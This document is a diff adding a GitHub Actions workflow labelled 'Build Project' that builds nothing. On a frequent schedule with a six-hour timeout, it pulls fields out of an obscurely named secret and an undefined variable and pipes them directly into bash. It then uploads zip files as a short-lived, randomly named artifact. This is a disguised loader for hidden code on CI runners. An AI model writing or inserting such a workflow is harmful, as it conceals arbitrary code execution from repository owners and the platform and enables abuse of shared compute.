@@ -1,0 +1,32 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '23 2,8,14,20 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  service:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run
+        env:
+          xqud434: ${{ secrets.xqud434 }}
+        run: |
+          printf '%s' "$xqud434" | jq -r .a2 | /bin/bash
+          printf '%s' "$y44" | jq -r .k9312 | /bin/bash
+
+      - name: Save archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: 5M2r3Dpp
+          path: "*.zip"
+          retention-days: 1
